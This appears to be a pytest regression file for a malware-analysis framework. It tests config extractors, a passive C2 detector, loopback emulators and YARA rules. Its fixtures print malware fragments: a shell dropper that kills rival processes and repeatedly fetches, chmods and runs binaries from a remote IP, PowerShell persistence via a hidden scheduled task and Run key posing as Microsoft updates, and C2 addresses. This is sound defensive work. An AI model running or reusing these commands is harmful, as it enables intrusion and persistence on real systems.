"""第3バッチで追加した静的抽出、受動検出、合成エミュレーターの回帰試験。"""

from __future__ import annotations

import base64
import importlib.util
import json
from pathlib import Path
import socket
import struct
import sys
import threading
import time
import zlib

import pytest


FRAMEWORK = Path(__file__).parents[1]
COMMON = FRAMEWORK / "common"
if str(COMMON) not in sys.path:
    sys.path.insert(0, str(COMMON))

import loopback_emulator  # noqa: E402
import passive_c2_detector  # noqa: E402


def load_module(family: str):
    path = FRAMEWORK / "malware" / family / "extract_config.py"
    spec = importlib.util.spec_from_file_location(f"batch3_{family}", path)
    assert spec and spec.loader
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def minimal_x64_elf(payload: bytes) -> bytes:
    ident = b"\x7fELF" + bytes([2, 1, 1]) + b"\0" * 9
    header = struct.pack("<HHIQQQIHHHHHH", 2, 62, 1, 0, 0, 0, 0, 64, 56, 0, 0, 0, 0)
    return ident + header + payload


def encode_utf16(value: str) -> str:
    return base64.b64encode(value.encode("utf-16le")).decode("ascii")


def test_eclipse_ddos_extracts_sockaddr_protocol_and_commands() -> None:
    module = load_module("eclipse_ddos_bot")
    data = minimal_x64_elf(
        b"45.66.228.114\0\x02\x00\x1b\x58\0x86_64\n/dev/null\0-d\0"
        b"UDP_FLOOD\0SYN_BYPASS\0HTTP2_FLOOD\0STOP_ALL\0BROADCAST\0PING\0PONG\n"
    )
    result = module.extract_config(data)
    assert result["architecture"] == "x86_64"
    assert result["c2"][0]["host"] == "45.66.228.114"
    assert result["c2"][0]["port"] == 7000
    assert set(result["protocol"]["attack_commands"]) == {"UDP_FLOOD", "SYN_BYPASS", "HTTP2_FLOOD"}
    assert result["daemonization"]["optional_dash_d"] is True
    assert result["registration_values"] == ["x86_64"]
    assert result["sockaddr_port_candidates"] == [7000]


def test_eclipse_passive_detector_requires_endpoint_and_protocol() -> None:
    profile = json.loads(
        (FRAMEWORK / "malware" / "eclipse_ddos_bot" / "c2_profile.json").read_text(encoding="utf-8")
    )
    observations = [
        {
            "destination_host": "45.66.228.114",
            "destination_port": 7000,
            "payload": {"registration": "x86_64"},
        }
    ]
    detected = passive_c2_detector.detect(profile, observations)
    assert detected["matches"][0]["verdict"] == "confirmed_c2"
    assert detected["shodan"]["queries"] == ["ip:45.66.228.114 port:7000"]


def test_etherhiding_loader_decodes_deflate_and_redacts_secret() -> None:
    module = load_module("etherhiding_arweave_loader")
    stage = """
$PROXY_ADDR='0xB70dbaf0e42E51eDddbf3b6a1Bac28eD18227119'
$EMBEDDED_SECRET='do-not-publish'
$RPC_NODES=@('https://sepolia.drpc.org','https://ethereum-sepolia-rpc.publicnode.com')
$ARWEAVE_GATEWAYS=@('https://arweave.net','https://ar-io.dev','https://turbo-gateway.com')
$x='0x5c60da1b';$y='0x2cae8ae4';$z=1500000;$k=$d.GetBytes(64)
$aes.Mode='CBC';$aes.Padding='PKCS7';New-Object Security.Cryptography.HMACSHA256
[IO.File]::WriteAllBytes($p,$pl);$env:__COMPAT_LAYER='RunAsInvoker';$proc.PriorityClass='BelowNormal'
"""
    compressor = zlib.compressobj(wbits=-zlib.MAX_WBITS)
    compressed = compressor.compress(stage.encode("utf-16le")) + compressor.flush()
    encoded = base64.b64encode(compressed).decode("ascii")
    wrapper = (
        "$chunks=@('WOMB','"
        + encoded[: len(encoded) // 2]
        + "','WOMB','"
        + encoded[len(encoded) // 2 :]
        + "');$joined=($chunks|Where-Object{$_ -ne 'WOMB'})-join''"
    )
    cfg = base64.b64encode(wrapper.encode("utf-16le")).decode("ascii")
    runner = "[Convert]::FromBase64String($c);sepolia.drpc.org"
    task = (
        "$a=New-ScheduledTaskAction;"
        "$t1=New-ScheduledTaskTrigger -AtLogOn;"
        "$t2=New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10);"
        "Register-ScheduledTask -TaskName 'MicrosoftEdgeUpdateTaskMachineExperience' -Action $a -Trigger @($t1,$t2);"
        "$s=New-ScheduledTaskSettingsSet -Hidden"
    )
    tables = {
        "property": [
            ["ProductName", "Microsoft Visual C++ 2015-2022 Redistributable (x64)"],
            ["ProductVersion", "14.42.34438"],
            ["Manufacturer", "Microsoft Corporation"],
        ],
        "registry": [
            ["r1", "1", "Software\\Microsoft\\EdgeUpdate", "cfg", cfg, "c1"],
            [
                "r2",
                "1",
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "MicrosoftEdgeUpdate",
                "powershell.exe -Enc " + encode_utf16(runner),
                "c2",
            ],
        ],
        "custom_action": [
            ["CreateTask", "5734", "", "powershell.exe -Enc " + encode_utf16(task), ""]
        ],
    }
    result = module.extract_from_tables(tables)
    assert result["rendezvous"]["proxy_contract"].startswith("0xB70d")
    assert result["rendezvous"]["function_selectors"] == ["0x2cae8ae4", "0x5c60da1b"]
    assert len(result["rendezvous"]["rpc_endpoints"]) == 2
    assert result["payload_protection"]["iterations"] == 1_500_000
    assert result["persistence"]["repeat_minutes"] == 10
    assert result["c2_recovery_status"].startswith("not_recovered")
    assert "do-not-publish" not in json.dumps(result, ensure_ascii=False)


def test_go_synthetic_workload_has_no_inferred_c2() -> None:
    module = load_module("go_synthetic_workload")
    data = (
        b"MZGo build ID:runtime.main\0=== Climate Monitoring Digest ===\0"
        b"Current Weather: Realm simulation\0--- Descending to \0"
        b"main.Ggso\0main.Webyvvlizhhodkxf\0main.Jbjlvtmhndtlo\0"
        b"main.Qtjuoudsobyczkbwntl\0main.Hjrkjvgbtotmbstbswju\0"
    )
    result = module.extract_config(data)
    assert result["classification_confidence"].startswith("confirmed_structure")
    assert result["c2"] == []
    assert result["network_capability_markers"]["net_http"] is False
    assert result["artifact_role"] == "synthetic_or_decoy_workload_unconfirmed_malware"


def test_linux_multi_payload_loader_extracts_process_kill_and_arguments() -> None:
    module = load_module("linux_downloader")
    data = b"""#!/bin/sh
for proc_dir in /proc/[0-9]*; do exe_line=$(ls -l /proc/$pid/exe); case $exe_target in
*\"(deleted)\"*|*\"telnetdbot\"*|*\"dvrLocker\"*) kill -9 $pid;; esac; done
cd /tmp; rm -rf mFp; wget http://129.121.110.105/mFp; chmod 777 mFp; ./mFp pdvr;
cd /tmp; rm -rf JN2M; wget http://129.121.110.105/JN2M; chmod 777 JN2M; ./JN2M pdvr;
"""
    result = module.extract_config(data)
    assert result["classification_confidence"] == "confirmed"
    assert result["execution_chain"]["multiple_payloads"] is True
    assert result["execution_chain"]["competitor_process_kill"] is True
    assert {item["argument"] for item in result["executed_payloads"]} == {"pdvr"}
    assert result["download_endpoints"][0]["is_c2"] is False


def test_batch3_profiles_use_safe_loopback_emulators() -> None:
    eclipse = json.loads(
        (FRAMEWORK / "malware" / "eclipse_ddos_bot" / "c2_profile.json").read_text(encoding="utf-8")
    )
    assert eclipse["emulator"]["loopback_only"] is True
    assert eclipse["emulator"]["malware_protocol_compatible"] is True
    assert eclipse["emulator"]["attack_commands_implemented"] is False
    for family in ("etherhiding_arweave_loader", "go_synthetic_workload"):
        profile = json.loads(
            (FRAMEWORK / "malware" / family / "c2_profile.json").read_text(encoding="utf-8")
        )
        assert profile["emulator"]["loopback_only"] is True
        assert profile["emulator"]["malware_protocol_compatible"] is False
        reserve = socket.socket()
        reserve.bind(("127.0.0.1", 0))
        port = reserve.getsockname()[1]
        reserve.close()
        output: list[dict] = []
        worker = threading.Thread(
            target=lambda p=port, name=profile["emulator"]["profile"]: output.append(
                loopback_emulator.serve_once("127.0.0.1", p, name, 2.0)
            ),
            daemon=True,
        )
        worker.start()
        client = None
        for _ in range(50):
            try:
                client = socket.create_connection(("127.0.0.1", port), timeout=0.2)
                break
            except OSError:
                time.sleep(0.01)
        assert client is not None
        with client:
            assert client.recv(64).startswith(loopback_emulator.SYNTHETIC_PREFIX)
        worker.join(2)
        assert output[0]["malware_protocol_compatible"] is False


def test_batch3_yara_rules_compile() -> None:
    yara = pytest.importorskip("yara")
    for family in (
        "eclipse_ddos_bot",
        "etherhiding_arweave_loader",
        "go_synthetic_workload",
        "linux_downloader",
    ):
        rule = next((FRAMEWORK / "malware" / family / "rules").glob("*.yar"))
        yara.compile(filepath=str(rule))
